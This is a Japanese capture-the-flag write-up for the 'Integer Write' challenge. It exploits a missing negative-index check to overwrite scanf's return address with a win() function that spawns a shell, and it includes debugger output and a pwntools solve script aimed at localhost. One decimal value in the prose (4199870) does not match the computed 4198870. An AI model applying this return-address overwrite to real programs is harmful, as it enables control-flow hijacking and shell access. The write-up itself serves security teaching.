# ■ Integer Write
[Challenges - AlpacaHack](https://alpacahack.com/challenges)

## 1. Writeup

`main.c#L16-L28`:
```C
16	void win() {
17	    execve("/bin/sh", NULL, NULL);
18	}
19	
20	int main(void) {
21	    int integers[100], pos;
22	
23	    /* disable stdio buffering */
24	    setbuf(stdin, NULL);
25	    setbuf(stdout, NULL);
26	    setbuf(stderr, NULL);
27	
28	    printf("pos > ");
29	    scanf("%d", &pos);
30	    if (pos >= 100) {
31	        puts("You're a hacker!");
32	        return 1;
33	    }
34	    printf("val > ");
35	    scanf("%d", &integers[pos]);
36	
37	    return 0;
38	}
```

`pos` が100以上の値であるかのチェックはあるが, 負の値に対するチェックが存在しないので, 配列外参照できる.

> [!note]
> 正の値での配列外書き込みが可能であるならば, 関数 `main` の( `__libc_start_main` への)リターンアドレスを書き換えればよいが, 今回はこれができない.

そこで, `scanf` の関数呼び出しに利用されるリターンアドレスを書き換えればよいとあたりをつける.

e.g. `scanf("%d", &integers[pos]);`の動作:
1. `main` が `scanf` を呼び出す. リターンアドレスをスタックに保存.
2. `scanf` は渡されたアドレス `$integer[pos]` に対して入力を書き込む.
3. `scanf` から 1. で保存したリターンアドレスへジャンプ.

### 1.1. offsetを特定

```c
pwndbg> b __isoc99_scanf
Breakpoint 1 at 0x4010e0
pwndbg> r
pos >
Breakpoint 1, __isoc99_scanf (format=0x402013 "%d") at isoc99_scanf.c:25
pwndbg> c
Continuing.
99
val >
Breakpoint 1, __isoc99_scanf (format=0x402013 "%d") at isoc99_scanf.c:25
```

`pos` に99を入れたのでこれがstackに乗っている.

```c
pwndbg> x/10wx $rsp
0x7fffffffdc08: 0x004012ca      0x00000000      0x00000040      0x00000000
0x7fffffffdc18: 0x00000040      0x00000063      0x00000008      0x00000000
0x7fffffffdc28: 0x00000800      0x00000000
```

`0x7fffffffdc08: 0x004012ca` は現在のcallによってpushされたリターンアドレス. `0x7fffffffdc1c: 0x00000063` が `pos` の値であり, `0x7fffffffdc20`以降が配列 `integers` となる.

int型が4 byteなので, 以下の計算によって `integers[0]` からリターンアドレスへのオフセット `6` を得られる.

```c
pwndbg> p (0x7fffffffdc20 - 0x7fffffffdc08)/4
$1 = 0x6
```

### 1.2. `win` のシンボル値の取得

```bash
$ nm chal | grep win
00000000004011d6 T win

$ python -c 'print(0x004011d6)'
4198870
```

`scanf` のリターンアドレスに, 得られた値 `0x4011d6`(`4199870`) で書き換えることで `scanf` からリターンしたときに `win` を実行できる.

> [!note]
> 今回はASLRによるアドレスのランダマイズがされていないので単純な書き換えだけで解決できる.
### 1.3. Exploit
以上を踏まえて入力を渡せば良い.

`solve.py`:
```python
 1	from pwn import *
 2	
 3	HOST = 'localhost'
 4	PORT = 8080
 5	io = remote(HOST, PORT)
 6	
 7	io.sendlineafter(b'pos >', b'-6')
 8	io.sendlineafter(b'val >', str(0x4011d6).encode())
 9	io.interactive()
```
